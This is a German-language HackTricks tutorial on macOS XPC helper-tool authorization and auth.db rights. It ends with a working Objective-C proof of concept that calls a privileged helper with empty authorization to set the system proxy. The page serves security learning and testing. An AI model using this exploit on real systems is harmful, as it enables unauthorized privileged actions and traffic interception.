# macOS XPC Autorisierung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## XPC Autorisierung

Apple schlägt auch einen anderen Weg vor, um zu authentifizieren, ob der verbindende Prozess **Berechtigungen zum Aufrufen der freigegebenen XPC-Methode hat**.

Wenn eine Anwendung **Aktionen als privilegierter Benutzer ausführen muss**, installiert sie normalerweise anstelle des Ausführens der App als privilegierter Benutzer als Root ein HelperTool als XPC-Dienst, der von der App aufgerufen werden kann, um diese Aktionen auszuführen. Die App, die den Dienst aufruft, sollte jedoch über ausreichende Autorisierung verfügen.

### ShouldAcceptNewConnection immer YES

Ein Beispiel hierfür findet sich in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` versucht es, eine Verbindung zum **HelperTool** herzustellen. Und in `HelperTool/HelperTool.m` wird die Funktion **`shouldAcceptNewConnection`** **keine** der zuvor angegebenen Anforderungen überprüfen. Sie gibt immer YES zurück:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Für weitere Informationen darüber, wie Sie diese Überprüfung ordnungsgemäß konfigurieren können:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### Anwendungsrechte

Es findet jedoch eine **Autorisierung statt, wenn eine Methode aus dem HelperTool aufgerufen wird**.

Die Funktion **`applicationDidFinishLaunching`** aus `App/AppDelegate.m` erstellt nach dem Start der App eine leere Autorisierungsreferenz. Dies sollte immer funktionieren.\
Anschließend wird versucht, **einige Rechte hinzuzufügen** zu dieser Autorisierungsreferenz durch Aufruf von `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Die Funktion `setupAuthorizationRights` aus `Common/Common.m` speichert die Rechte der Anwendung in der Authentifizierungsdatenbank `/var/db/auth.db`. Beachten Sie, wie sie nur die Rechte hinzufügt, die noch nicht in der Datenbank vorhanden sind:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Die Funktion `enumerateRightsUsingBlock` wird verwendet, um die Berechtigungen von Anwendungen abzurufen, die in `commandInfo` definiert sind:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Dies bedeutet, dass am Ende dieses Prozesses die in `commandInfo` deklarierten Berechtigungen in `/var/db/auth.db` gespeichert werden. Beachten Sie, dass Sie dort für **jede Methode**, die **Authentifizierung erfordert**, den **Berechtigungsnamen** und den **`kCommandKeyAuthRightDefault` finden können. Letzterer **zeigt an, wer dieses Recht erhalten kann**.

Es gibt verschiedene Bereiche, um anzuzeigen, wer ein Recht erhalten kann. Einige von ihnen sind in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) definiert (Sie können [alle von ihnen hier finden](https://www.dssw.co.uk/reference/authorization-rights/)), aber zusammengefasst:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Wert</th><th>Beschreibung</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Jeder</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niemand</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Aktueller Benutzer muss ein Administrator sein (innerhalb der Admin-Gruppe)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Benutzer zur Authentifizierung auffordern.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Benutzer zur Authentifizierung auffordern. Er muss ein Administrator sein (innerhalb der Admin-Gruppe)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Regeln festlegen</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Zusätzliche Kommentare zum Recht angeben</td></tr></tbody></table>

### Rechteüberprüfung

In `HelperTool/HelperTool.m` überprüft die Funktion **`readLicenseKeyAuthorization`**, ob der Aufrufer berechtigt ist, **eine solche Methode auszuführen**, indem die Funktion **`checkAuthorization`** aufgerufen wird. Diese Funktion überprüft, ob die vom aufrufenden Prozess gesendeten **authData** das **richtige Format** hat, und überprüft dann, **was benötigt wird, um das Recht zu erhalten**, die spezifische Methode aufzurufen. Wenn alles gut läuft, wird der **zurückgegebene `Fehler` `nil` sein**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Beachten Sie, dass zur Überprüfung der Anforderungen, um das Recht zu erhalten, diese Methode aufzurufen, die Funktion `authorizationRightForCommand` einfach das zuvor kommentierte Objekt `commandInfo` überprüfen wird. Anschließend wird sie `AuthorizationCopyRights` aufrufen, um zu überprüfen, ob sie das Recht hat, die Funktion aufzurufen (beachten Sie, dass die Flags die Interaktion mit dem Benutzer ermöglichen).

In diesem Fall ist für den Aufruf der Funktion `readLicenseKeyAuthorization` das `kCommandKeyAuthRightDefault` auf `@kAuthorizationRuleClassAllow` festgelegt. So kann es von jedermann aufgerufen werden.

### DB-Informationen

Es wurde erwähnt, dass diese Informationen in `/var/db/auth.db` gespeichert sind. Sie können alle gespeicherten Regeln auflisten mit:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Dann können Sie lesen, wer das Recht mit zugreifen kann:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Erlaubnisrechte

Sie können **alle Berechtigungskonfigurationen** [**hier**](https://www.dssw.co.uk/reference/authorization-rights/) finden, aber die Kombinationen, die keine Benutzerinteraktion erfordern, wären:

1. **'authenticate-user': 'false'**
* Dies ist der direkteste Schlüssel. Wenn er auf `false` gesetzt ist, wird angegeben, dass ein Benutzer keine Authentifizierung benötigt, um dieses Recht zu erlangen.
* Dies wird in **Kombination mit einem der beiden unten stehenden oder der Angabe einer Gruppe** verwendet, der der Benutzer angehören muss.
2. **'allow-root': 'true'**
* Wenn ein Benutzer als Root-Benutzer (der über erhöhte Berechtigungen verfügt) arbeitet und dieser Schlüssel auf `true` gesetzt ist, könnte der Root-Benutzer dieses Recht potenziell ohne weitere Authentifizierung erlangen. In der Regel erfordert das Erreichen des Root-Benutzerstatus jedoch bereits eine Authentifizierung, sodass dies für die meisten Benutzer kein Szenario ohne Authentifizierung ist.
3. **'session-owner': 'true'**
* Wenn auf `true` gesetzt, würde der Besitzer der Sitzung (der aktuell angemeldete Benutzer) automatisch dieses Recht erhalten. Dies könnte zusätzliche Authentifizierung umgehen, wenn der Benutzer bereits angemeldet ist.
4. **'shared': 'true'**
* Dieser Schlüssel gewährt keine Rechte ohne Authentifizierung. Wenn er auf `true` gesetzt ist, bedeutet dies stattdessen, dass das Recht nach der Authentifizierung unter mehreren Prozessen geteilt werden kann, ohne dass jeder einzelne erneut authentifiziert werden muss. Die erstmalige Gewährung des Rechts erfordert jedoch weiterhin eine Authentifizierung, es sei denn, sie wird mit anderen Schlüsseln wie `'authenticate-user': 'false'` kombiniert.

Sie können [**dieses Skript**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) verwenden, um die interessanten Rechte zu erhalten:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Umgekehrte Autorisierung

### Überprüfen, ob EvenBetterAuthorization verwendet wird

Wenn Sie die Funktion finden: **`[HelperTool checkAuthorization:command:]`**, verwendet der Prozess wahrscheinlich das zuvor erwähnte Schema für die Autorisierung:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn diese Funktion Funktionen wie `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` aufruft, wird [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) verwendet.

Überprüfen Sie die **`/var/db/auth.db`**, um zu sehen, ob es möglich ist, Berechtigungen zum Aufrufen einer privilegierten Aktion ohne Benutzerinteraktion zu erhalten.

### Protokollkommunikation

Dann müssen Sie das Protokollschema finden, um eine Kommunikation mit dem XPC-Dienst herstellen zu können.

Die Funktion **`shouldAcceptNewConnection`** gibt das exportierte Protokoll an:

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In diesem Fall haben wir dasselbe wie bei EvenBetterAuthorizationSample, [**überprüfen Sie diese Zeile**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Nachdem Sie den Namen des verwendeten Protokolls kennen, ist es möglich, **seine Headerdefinition zu dumpen** mit:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Zuletzt müssen wir nur den **Namen des freigelegten Mach-Dienstes** kennen, um eine Kommunikation damit herzustellen. Es gibt mehrere Möglichkeiten, dies herauszufinden:

* Im **`[HelperTool init]`**, wo Sie den verwendeten Mach-Dienst sehen können:

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

* In der launchd-Property-Liste:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Beispiel

In diesem Beispiel wird erstellt:

* Die Definition des Protokolls mit den Funktionen
* Eine leere Authentifizierung, die verwendet wird, um Zugriff anzufordern
* Eine Verbindung zum XPC-Dienst
* Ein Aufruf der Funktion, wenn die Verbindung erfolgreich war
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Referenzen

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys einreichen.

</details>
